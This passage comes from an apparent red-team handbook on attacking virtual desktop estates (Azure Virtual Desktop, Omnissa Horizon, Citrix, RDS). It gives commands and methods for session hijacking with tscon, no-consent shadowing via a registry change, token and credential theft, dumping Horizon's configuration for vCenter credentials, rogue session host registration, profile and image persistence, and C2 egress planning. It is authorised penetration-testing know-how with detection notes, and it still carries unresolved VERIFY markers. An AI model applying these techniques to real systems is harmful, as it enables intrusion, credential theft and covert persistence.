**Why the architecture matters.** AVD uses **reverse connect** transport. The session host does not listen for inbound RDP; instead its agent establishes an outbound TLS connection to the AVD service, and client sessions are tunnelled back through it. No inbound ports are required on the session host, and the session host needs outbound HTTPS to the service endpoints, matching `*.wvd.microsoft.com` among others.

Two consequences follow directly. First, you cannot reach an AVD session host by scanning for 3389, because it is not listening; the broker is the only way in, and the broker is Azure. Second, the session host has guaranteed, mandatory, allow-listed outbound HTTPS to Microsoft-owned endpoints. That is exactly the egress condition a modern C2 profile wants, and it is developed in the egress section below and in the Command and Control section.

**Agent evidence and configuration.** The agent installs under `C:\Program Files\Microsoft RDInfra\`, with an `RDAgentBootLoader` service that supervises the agent proper. The agent's configuration, including the host pool it belongs to and the broker URL, is in the registry. <!-- VERIFY exact registry key path under HKLM\SOFTWARE\Microsoft for the AVD agent configuration and the value names holding the host pool name and broker URL -->

**The registration token.** A session host joins a host pool by presenting a registration token generated for that pool. The token is a bearer credential for "become a session host in this pool". An attacker who obtains one, or who has the Azure RBAC rights to generate one, can register a machine they control into a production host pool, at which point the broker will assign real users' sessions to it. That is a credential-harvesting position of extraordinary quality: users authenticate to a host you own, and everything they do happens on it. Registration tokens are time-limited, which is the main mitigating factor. <!-- VERIFY the Az PowerShell and Azure CLI commands for reading and generating an AVD host pool registration token -->

**RBAC as the management plane.** The Azure roles are the control plane, and each maps to a concrete capability.

| Role or right | Capability | Attacker value |
| --- | --- | --- |
| Desktop Virtualization Contributor | Full management of AVD objects | Everything below |
| Host Pool Contributor | Modify host pools, including custom RDP properties and registration tokens | Enable drive and clipboard redirection estate-wide; register rogue session hosts |
| Application Group Contributor | Manage application groups and their published applications | Publish an arbitrary executable as a RemoteApp, then assign it to yourself |
| Virtual Machine Contributor, or any role with Run Command | Run arbitrary commands on the session host VM | SYSTEM on the session host, bypassing the session entirely |
| Virtual Machine Administrator Login | Administrator sign-in to the VM | Local administrator on the session host |
| Storage File Data SMB Share Elevated Contributor on the FSLogix storage account | Set NTFS permissions on the profile share | Read and write every user's profile container |

<!-- VERIFY exact current role names and the precise Azure permission that grants Run Command on a VM -->

The last row is the quiet one. Azure Files backed FSLogix deployments assign the elevated contributor role to administrators so they can set NTFS permissions, and that role over the profile share means read and write access to every user's profile container, which is both bulk credential material and a per-user code execution primitive at next logon.

The Run Command row is the loud one, and it is the shortest path from any Azure foothold to SYSTEM on a session host. If you have compromised an identity with VM management rights over the session host resource group, you do not need to break out of anything.

**Diagnostics.** AVD sends diagnostics to Log Analytics in a set of tables: `WVDConnections` for every connection attempt with a `ResourcesAlias` column indicating whether the user connected to a full desktop or a published application, `WVDErrors` for management, host registration and subscription errors, `WVDCheckpoints` for per-connection lifecycle events including published applications the user opened, `WVDAgentHealthStatus`, `WVDConnectionNetworkData` and `WVDManagement` and `WVDFeeds`. Assume all of it is on, because it is trivially enabled and commonly is. Notably, `WVDCheckpoints` tracks published applications the user opens, which means your breakout attempt via an unexpected application is visible in the control plane's own telemetry and not only in host-based logging.

### Omnissa Horizon

**What it is.** Formerly VMware Horizon, now an Omnissa product following the divestiture of VMware's end-user computing business. Current naming is Omnissa Horizon, with the components installing under `C:\Program Files\Omnissa\Horizon\` on recent builds and `C:\Program Files\VMware\VMware View\` on older ones. Expect a mixed estate; the rename is recent enough that both paths are live.

**Components.** The **Connection Server** is the broker and management plane. The **Horizon Agent** runs on each desktop or session host. The **Horizon Client** is the endpoint software. **Unified Access Gateway** is the internet-facing appliance. **Horizon Console** is the administrative web interface. **App Volumes** delivers applications as attachable virtual disks. **Dynamic Environment Manager** is the profile and settings layer. **Instant Clone** is the current non-persistent provisioning mechanism; View Composer and its linked clones are retired.

**Protocols.** Blast Extreme is the current default display protocol, with PCoIP and plain RDP also supported. Each has its own ports; consult the vendor's port documentation for the current set rather than guessing, because the list changes between releases.

**The Connection Server's configuration store is the prize.** Horizon holds its configuration in an embedded Microsoft AD LDS (formerly ADAM) LDAP directory on the Connection Server, and that directory contains the whole pod configuration: vCenter connection details, the Instant Clone Active Directory provisioning accounts, desktop pool configuration, and user entitlements. Multiple Connection Servers replicate the directory between themselves. The directory is inspectable with standard LDAP tooling against the Connection Server, and the supported export tool is `vdmexport`, with `vdmadmin` providing broader administrative operations. On current builds these live under `C:\Program Files\Omnissa\Horizon\Server\tools\bin\`.

Replication management is performed against `localhost:22389`, and the directory is browsable with ADSI Edit against the local server using a distinguished name of `dc=vdi,dc=vmware,dc=int`. <!-- VERIFY whether the base DN changed from dc=vdi,dc=vmware,dc=int in Omnissa-branded releases -->

```cmd
"C:\Program Files\Omnissa\Horizon\Server\tools\bin\vdmexport.exe" -f C:\Windows\Temp\ldap.ldf
```

That export is the Horizon equivalent of a domain-wide configuration dump: entitlements, pools, and the service accounts used to provision machines and to talk to vCenter. The vCenter credentials in particular are the bridge to the hypervisor, which is the virtualisation material earlier in this section, and from a hypervisor you own every virtual desktop and every session host regardless of what any of them are running.

**Vulnerability note.** The single most consequential Horizon vulnerability in recent history was not a Horizon bug at all: CVE-2021-44228, Log4Shell, was exploitable against internet-facing Horizon Connection Servers and was exploited at scale, giving code execution on the broker. Do not confuse it with CVE-2022-22954, which is Workspace ONE Access rather than Horizon. Both were heavily exploited and both are frequently mislabelled in reporting.

### Exploiting the shared host

This is where the engagement usually turns, and it applies the moment you have code execution on a multi-session host regardless of how you got there.

#### Enumerating who else is here

```cmd
qwinsta
quser
query session
tasklist /v
qprocess *
```

```powershell
Get-Process -IncludeUserName | Group-Object UserName | Sort-Object Count -Descending
Get-CimInstance Win32_LogonSession | Select-Object LogonId, LogonType, StartTime
Get-CimInstance Win32_LoggedOnUser
```

Read the output for identity, not just for names. A session belonging to an account whose name matches an administrative naming convention, a service desk convention, or a third-party convention is worth more than ten ordinary users. Processes tell you more than session lists: a management console, a database client, an RSAT tool or a PowerShell session running under another user's identity tells you what that user has been delegated.

`netstat -ano` correlated against process owners maps out which user is connected to which server, which is a delegation map you did not have to ask for.

#### Tokens

**What it is.** Every process on the host runs with a token, and tokens can be duplicated and impersonated by a caller holding the right privilege.

**Why it works.** With `SeDebugPrivilege` or local administrator you can open other users' processes and duplicate their tokens, giving you their identity for network authentication without ever touching a password or a hash. On a session host this is unusually valuable because the tokens available are not the one or two you would find on a workstation but dozens, refreshed continuously as people log on.

The full mechanics of token duplication, impersonation, the privileges required, and the potato family of `SeImpersonatePrivilege` abuses are in the Windows Post-Exploitation section. What is specific to session hosts is the density of the target set and the fact that an interactive token, unlike a network logon token, carries delegatable credentials.

**Preconditions.** Local administrator or SYSTEM on the session host for other users' tokens. Your own session's token needs nothing.

**Detection and opsec.** Process access to other users' processes with the rights needed to duplicate a token is a first-class EDR detection. Handle access to `lsass.exe` specifically is the most heavily monitored operation in Windows.

#### Credential material

A multi-session host is the densest credential target in a typical estate outside a domain controller, and the reason is simply that credential material is per-logon-session and there are many logon sessions.

What is present, and where the mechanics live in this document:

- **LSASS memory**: msv1_0 credentials and Kerberos keys for every currently logged-on user. See the credential extraction material in the Windows Post-Exploitation section.
- **Kerberos ticket cache**: TGTs and service tickets for every session, extractable per logon session identifier with local administrator. See the Kerberos Abuse section.
- **DPAPI**: each user's master keys are decrypted in memory while they are logged on, and their protected blobs are in their profile. See the Windows Post-Exploitation section for DPAPI, and note that on a session host you get many users' blobs from one filesystem.
- **Browser credential and token stores**: VDI users do all their browsing on the session host, so browser profiles here hold the cookies, session tokens and saved passwords for the entire user population. On a container-backed profile deployment they are all in the container store, which is one share.
- **Saved RDP and client credentials**, credential manager vaults, and PuTTY or WinSCP stored sessions, per user.
- **Scheduled task credentials and service account passwords** stored as LSA secrets, which is host-wide rather than per-user.

A note on Credential Guard, because it materially changes the yield. Where Virtualisation-Based Security and Credential Guard are enabled, LSASS no longer holds derived credentials in a form you can extract, and the answer becomes token theft, ticket theft and interception rather than dumping. Session hosts are less likely to have it enabled than workstations, partly for nested virtualisation and performance reasons in some hypervisor and provisioning configurations, so check rather than assume in either direction.

```powershell
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
  Select-Object SecurityServicesConfigured, SecurityServicesRunning
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL
```

**Opsec on a busy host.** Dumping process memory on a session host with forty active users is not a quiet operation and it is not a cheap one. A large memory read causes measurable performance impact that real people notice and report, and the write of a dump file to disk is both a detection and a data-at-rest problem. Prefer targeted extraction over bulk dumping here more than anywhere else, and prefer doing it out of hours.

#### Session hijacking

**What it is.** Taking over another user's existing session, either by connecting their session to your terminal or by shadowing it.

**Why it works.** Two distinct mechanisms with very different properties.

`tscon` connects a named session to a target terminal. Run as SYSTEM, it does this without needing the session owner's password, because the credential check is skipped for SYSTEM. The consequence is that you get their fully authenticated desktop, with their tokens, their mapped drives, their open applications and their credential state, and they lose it: their session detaches from wherever it was and attaches to yours. This is powerful and extremely disruptive.

**Shadowing** is the supported remote-control feature. `mstsc.exe /v:$TARGET /shadow:<sessionid> /control /noConsentPrompt` requests a shadow of a session, and the behaviour is governed by the `Shadow` value under `HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services`, set by the "Set rules for remote control of Remote Desktop Services user sessions" policy: `0` not allowed, `1` full control with consent, `2` full control without consent, `3` view with consent, `4` view only without consent. Local administrator on the target host is required.

**Preconditions.** SYSTEM on the session host for the `tscon` route. Local administrator plus a permissive `Shadow` value for the shadowing route. Note that setting `Shadow` yourself is a configuration change to the host and is both loggable and durable.

**Commands.**

```cmd
:: Enumerate sessions and identify the target
query session

:: Hijack: attach session 3 to the current terminal. SYSTEM required.
tscon 3 /dest:%SESSIONNAME%

:: Shadow with full control and no consent prompt, from another machine
mstsc.exe /v:$TARGET /shadow:3 /control /noConsentPrompt

:: Enable no-consent full control if policy currently forbids it. Loud and durable.
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f
```

**Verify it worked.** For `tscon`, the target desktop appears on your terminal. For shadowing, a window opens showing the session.

**Detection and opsec, and this one needs care.** `tscon` hijacking is immediately visible to the victim: their session vanishes. They will report it within minutes, and the report will say "my session disappeared and then came back different", which is about as clear an incident notification as exists. It also produces session connect and disconnect events on the host: Security event IDs 4778 and 4779 for session reconnect and disconnect, and the Local Session Manager operational log records session connect, disconnect, reconnect and logoff events. Do this only when you have decided the yield justifies a near-certain detection.

Shadowing is quieter but not silent. Depending on configuration the shadowed user may see an indication that their session is being remotely controlled, and with consent modes they are asked outright. The registry change to enable no-consent control is a configuration modification on a production server and is the kind of thing configuration monitoring catches.

Prefer, wherever it will do, to take the credential material or the token rather than the session. A duplicated token gives you the identity without taking the desktop away from a human being who is using it.

#### The administrator session host

The highest-value case is a session host used by administrators. This happens more than it should, in several recognisable shapes: a jump box implemented as a published desktop; a set of published administrative consoles delivered to a service desk; a published RSAT or SSMS or vSphere client; a "management" delivery group; a third-party support desktop. In each case the host holds administrative tokens, administrative tickets, and administrative credential material continuously, and the identity that matters is not the one you compromised.

The practical implication for target selection: if the estate has multiple delivery groups or host pools, work out which one the administrators use and get onto that one, because it is worth more than everything else combined. Published resource enumeration through StoreFront or the AVD workspace feed, delivery group membership, and simply reading `qwinsta` output across hosts all point at it.

### The platform management plane

The management plane is the real objective, because compromising the delivery infrastructure means code execution into every published session at will, plus the ability to add, modify and target published resources, plus the golden image. It is also frequently softer than the rest of the estate, because it is administered by a specialist team with its own service accounts and its own consoles, and because the platform's own database is often a SQL Server nobody in the security team has thought about.

#### Citrix

Three distinct routes to code execution across the estate, in rough order of directness.

**Publish or modify an application.** With site administration, publish `cmd.exe` (or a loader) as an application to a delivery group and entitle yourself to it, or change the command line of an application other users already launch. The second variant is the potent one: modify an existing published application so that every user who launches it runs your code first, as themselves, on whichever session host they land on. The Broker cmdlets are the interface, and they are also the audit trail, because configuration logging records the change.

```powershell
# On a Delivery Controller. The Citrix snap-ins must be loaded first.
Add-PSSnapin Citrix.*
Get-BrokerDesktopGroup | Select-Object Name, DesktopKind, SessionSupport, Enabled
Get-BrokerApplication | Select-Object Name, ApplicationName, CommandLineExecutable, CommandLineArguments, Enabled
Get-BrokerMachine | Select-Object MachineName, RegistrationState, SessionCount, InMaintenanceMode
Get-BrokerSession | Select-Object UserName, MachineName, SessionState, ClientName, StartTime
Get-BrokerApplicationInstance
```

<!-- VERIFY that Set-BrokerApplication accepts -CommandLineExecutable and -CommandLineArguments on current CVAD SDK versions, and confirm the machine catalogue cmdlet name -->

`Get-BrokerSession` on its own is worth the trip: it enumerates every session in the site with the username, the machine, the client name and the state. That is a real-time map of who is logged in where, across the whole estate, from one place.

**Workspace Environment Management.** WEM's **External Tasks** run scripts or applications at the user session level, with the path resolved in the user environment, triggered by session events including agent refresh. That is, by design and by documentation, a mechanism for running a program of your choosing in every user's session. **Scripted Tasks** are the machine-level equivalent. If WEM is deployed and you reach its configuration, you have code execution into every session without touching the broker, the image, or any session host individually. It is the single most direct estate-wide execution primitive in the Citrix stack and it is far less monitored than the broker.

**The image.** Machine Creation Services builds machines from a master image snapshot and Citrix Provisioning streams a vDisk. Modify either and you have SYSTEM on every machine subsequently provisioned from it, permanently, surviving every reset. This is the persistence answer for a non-persistent estate and it is developed below.

**Adjacent targets.** The site database is a SQL Server, and `db_owner` on the site database is effectively site administration; see the MSSQL material in the Enterprise Services section for getting from a SQL foothold to code execution. Director reads the monitoring database and its help desk roles can shadow and log off sessions. Citrix DaaS adds Citrix Cloud as a control plane and the Cloud Connector as its on-premises agent, which means a Citrix Cloud administrative identity, or an API client's ID and secret, is a cloud-to-on-premises code execution path into the domain-joined estate. Treat Citrix Cloud credentials with the same seriousness as Entra ID credentials, and see the Cloud and Modern Identity section for the general pattern.

#### Remote Desktop Services

There is no separate plane. The Connection Broker holds the collection configuration, the session hosts are Windows servers, and the authorisation is Active Directory groups. The routes are therefore: local administrator on a session host, which gives you that host and everyone on it; modifying the collection's RemoteApp definitions through the Connection Broker, which changes what is published; and group policy applied to the session host organisational unit, which is the estate-wide route and is just an AD attack. Anyone who can edit a GPO linked to the session host OU has SYSTEM on every session host, which is the same conclusion the Active Directory: Enumeration section reaches by a different road.

#### Azure Virtual Desktop

Covered above under RBAC. The short version: Azure roles over the AVD objects let you publish arbitrary RemoteApps and change host pool RDP properties; Azure roles over the session host virtual machines let you run commands as SYSTEM; the registration token lets you insert a host you control into a production pool; and storage roles over the FSLogix share give you every profile. The management plane is Azure, and the Cloud and Modern Identity section is where the identity attacks live.

#### Omnissa Horizon

The Connection Server and its AD LDS directory, as described above. Horizon Console administrative roles, the vCenter credentials held in the directory, the Instant Clone provisioning account, and the golden image. Note the pivot: Horizon's directory contains the vCenter service account, and vCenter is the hypervisor, and from the hypervisor everything below is yours. That chain, published application to session host to Connection Server to vCenter to every virtual machine in the estate, is one of the cleanest escalation paths in enterprise infrastructure, and it is why the virtualisation material earlier in this section is the natural next read.

#### The profile store

Not a management plane in the vendor's sense, but it behaves like one. Whoever can write to the FSLogix container share or the Citrix Profile Management store can write into any user's profile, and a Startup shortcut or a `Run` value inside another user's profile executes as that user at their next logon on any session host. It requires no credential theft, no token theft and no interaction with the target. In an estate where the profile share's permissions have been relaxed, or where you have compromised the file server, or where you hold the elevated storage role in an Azure Files deployment, this is the most efficient lateral movement available and it scales to the entire user population at once.

```cmd
:: Confirm the store path, then test write access to another user's container directory.
reg query "HKLM\SOFTWARE\FSLogix\Profiles" /v VHDLocations
dir \\$TARGET\profiles$
icacls \\$TARGET\profiles$
```

Read the ACL rather than guessing. A correctly built container share grants users only the right to create their own container and denies traversal into others; a great many are not correctly built.

### Getting your tooling in and your traffic out

#### Why living off the land matters more here

Three reasons specific to this environment, over and above the general case in the Evasion and Payload Development section.

Ingress is genuinely hard. Redirection is often disabled, the clipboard is often size-limited and DLP-inspected, SMB egress from a server segment is usually blocked, and the session host frequently has no direct internet access. There may be no channel at all for a binary.

The host is instrumented. Session hosts are shared, they are where third parties land, and they are consequently among the best-monitored machines in a mature estate. A dropped binary is a file write, an execution, and a hash, all on a machine with EDR and often with session recording.

The host is disposable, which cuts both ways. Nothing you write persists, so anything you drop is work you will repeat, which argues for a tooling approach that needs nothing dropped.

The practical consequence is that the first thing you should try to establish is not a file transfer but a **channel**, and then to run everything through it. Cross-reference the Evasion and Payload Development section for in-memory execution and the Command and Control section for channel construction.

#### Transfer channels, ranked

| Channel | Direction | Availability | Notes |
| --- | --- | --- | --- |
| Redirected client drive (`\\tsclient\`, `\\Client\`) | Both | Often disabled in hardened deployments | Terminates on your own endpoint, bypasses session host egress filtering entirely |
| Clipboard | Both, independently controlled | Common | Text only in practice, size-limited, DLP-inspected. Base64 in chunks |
| HTML5 or browser client file transfer | Both | Where the browser-delivered client is used | Separate policy from drive mapping, so check both |
| Outbound HTTPS from the session host | Both | Depends on proxy policy | The best option if it exists. See egress below |
| WebDAV UNC (`\\host@443\`) | Both | Needs the WebClient service | Works where SMB egress is blocked and 443 is not |
| SMB to your host | Both | Usually blocked from server segments | Test rather than assume |
| A writable internal file share | Both | Very often available | Stage internally rather than externally. Much quieter |
| Redirected printer to file | Out | Where printer redirection is on | Awkward but real |
| The published application itself | Varies | Always worth checking | A mail client, a browser download directory, an application that fetches templates over HTTP |

The last row is underrated. If the published application legitimately fetches data over the network, that is a channel with a legitimate process at the near end.

The internal staging row is the one to reach for by default. You rarely need your tooling to come from outside; a writable share inside the estate, which the share enumeration material in the Network Enumeration section will find for you, is a better staging point than your own host in every respect: it is reachable, it is not egress, and traffic to it is unremarkable.

#### Egress and C2 from a session host

The egress posture of a session host is usually one of three shapes and it is worth determining which before choosing a C2 profile.

**No direct egress, explicit proxy required.** Common in mature estates. The proxy is configured per-user or per-machine, it may require authentication, and it categorises destinations. Your C2 must speak to the proxy, must authenticate to it if required, and must have a destination in an allowed category. The saving grace is that the proxy configuration is discoverable from inside the session.

```powershell
netsh winhttp show proxy
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /s
Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' |
  Select-Object ProxyEnable, ProxyServer, AutoConfigURL
```

**Allow-listed egress to platform endpoints.** This is the interesting one and it is close to universal, because these platforms cannot function without outbound access. AVD session hosts must reach `*.wvd.microsoft.com` and a set of other Microsoft endpoints over 443. Citrix DaaS estates must reach Citrix Cloud. Every estate reaches Windows Update, telemetry, certificate revocation endpoints and licensing. That is a set of allow-listed, TLS, high-volume destinations that the security team cannot block. The Command and Control section covers redirectors and legitimate-service channels; this environment is where that material earns its keep, because the allow list is unusually well documented and unusually rigid.

**Effectively open egress.** Still found, particularly in smaller estates and in Citrix deployments where the session hosts sit in a user-like segment.

**DNS** is worth testing separately in all three cases. Session hosts must resolve names, they resolve them through internal resolvers that forward, and DNS-based channels frequently survive where HTTP does not. It is slow and it is well-detected in mature environments, but as a fallback beacon it is often the thing that works.

**The display protocol as a channel.** Where the session host has genuinely no egress but you connect from your own machine, the display protocol's own virtual channels are a bidirectional path terminating on hardware you control. Redirected drives and the clipboard are the accessible form of this. It is not a C2 channel in the usual sense, it requires your interactive session to stay up, and it is slow, but it is a data path that no session host egress filter can see, and in a genuinely air-gapped published application environment it may be the only one. Cross-reference the Lateral Movement section for tunnelling over an established channel.

### Persistence in a non-persistent environment

A distinct problem, and the reason is simple: the host is going to be destroyed, so host-based persistence is a waste of effort. Persistence has to live somewhere that survives, and there are exactly four somewheres.

#### The image

**What it is.** The golden image, master image snapshot, provisioning vDisk or Azure Compute Gallery image version from which session hosts are built.

**Why it is the strongest option.** Code in the image runs as SYSTEM on every machine provisioned from it, on every provisioning cycle, indefinitely, and survives every host reset because it *is* what the host resets to. It is the single most durable persistence available in a VDI estate.

**Preconditions.** Access to the image build pipeline or to the image itself: the master virtual machine, the vDisk, the image version, or the automation that produces them. That is a management-plane compromise, not a session compromise.

**Detection and opsec.** Image changes are versioned, reviewed and, in a mature estate, produced by automation from source. Modifying an image outside the pipeline is highly visible to the team that owns it and produces a permanent artefact. Modifying the pipeline is quieter and more durable, and is a CI/CD attack rather than a VDI attack; see the CI/CD and source control material in the Cloud and Modern Identity section.

#### The identity

**What it is.** Persisting in the account rather than on any machine. A password you know, a second credential you added, a certificate you enrolled, a Kerberos key, a shadow credential on the object, a refresh token or Primary Refresh Token, an added device, a registered authenticator.

**Why it is the right default.** It is completely independent of which host you land on or whether the host is destroyed, it survives image rebuilds, and in the cloud-joined case it survives the machine entirely. The mechanics are elsewhere in this document: certificate-based persistence in the Coercion, Relay and Certificate Abuse section, Kerberos key and ticket persistence in the Kerberos Abuse section, token and device persistence in the Cloud and Modern Identity section.

**The VDI-specific angle.** Your access to this environment is mediated by an entitlement: a group membership that entitles you to a published resource, or an AVD application group assignment. That entitlement is itself a persistence target. Adding an account you control to the group that is entitled to a published desktop gives you a durable, legitimate-looking way back in that looks exactly like normal access provisioning, and it survives everything host-based.

#### The profile

**What it is.** The profile container, roaming profile store or redirected folder set, which persists by design and follows the user to whichever session host they land on next.

**Why it works.** The whole point of the profile layer is to carry the user's environment across hosts and logons. Anything the operating system executes from a profile-resident location therefore executes on every subsequent logon on every subsequent host.

**Locations, all inside the persisted profile.**

```text
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\    executed by explorer at logon
HKCU\Software\Microsoft\Windows\CurrentVersion\Run           in NTUSER.DAT, executed at logon
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell   your own shell at logon
HKCU\Software\Microsoft\Command Processor\AutoRun            on every cmd.exe start
HKCU\Environment                                             Path and PATHEXT for new processes
HKCU\Software\Classes\...\shell\open\command                 file and protocol handler hijack
```

**The critical caveat, and it is specific to this environment.** Citrix Profile Management and Dynamic Environment Manager both work from inclusion and exclusion lists, and FSLogix has its own redirection configuration. A location that is excluded from the profile does not persist. So before choosing a location, read the profile layer's configuration and find out what actually round-trips. The `Redirections.xml` file for FSLogix and the UPM inclusion and exclusion policy for Citrix are the documents that answer this. <!-- VERIFY the default location of FSLogix Redirections.xml and the exact Citrix UPM policy names for profile inclusion and exclusion lists -->

**Verify it worked.** Log off, log on again, ideally landing on a different session host, and confirm your artefact is present and ran. That round trip is the only real test, and it also tells you whether the profile layer is working the way you think it is.

**Detection and opsec.** Startup folder and `Run` key persistence are among the most heavily monitored techniques in existence. What is different here is that the artefact is written into a container on a file share, so file-integrity monitoring on the share may see it, and equally may not, since the container is an opaque VHDX from the share's point of view. That opacity is an advantage.

#### Logon scripts and the platform's own action layer

Every one of these platforms has a supported mechanism for running something at logon, which is a persistence mechanism with vendor documentation.

Active Directory user object `scriptPath`, and GPO logon scripts, are the general-purpose answer and are covered in the Active Directory persistence material in the Coercion, Relay and Certificate Abuse section and the Windows persistence material in the Windows Post-Exploitation section. Their VDI relevance is that in a non-persistent estate they are one of the few things guaranteed to run on every session regardless of which host serves it.

Citrix Workspace Environment Management External Tasks run in the user session at logon and refresh. Horizon Dynamic Environment Manager applies settings and can run tasks at logon. Both are legitimate configuration and both blend in perfectly, because a task running from the environment management layer is exactly what that layer exists to do.

**The principle to take away.** In a non-persistent desktop you persist in the identity, in the image, or in the profile. Never on the host. An operator who drops a service or a scheduled task on a pooled session host has achieved nothing and has left an artefact behind for a responder to find.

### Detection and opsec

#### What the platform itself logs

Beyond host-based logging, each platform maintains its own record of who connected to what and when, and it is held in the management plane rather than on the session host, which means clearing host logs does not touch it.
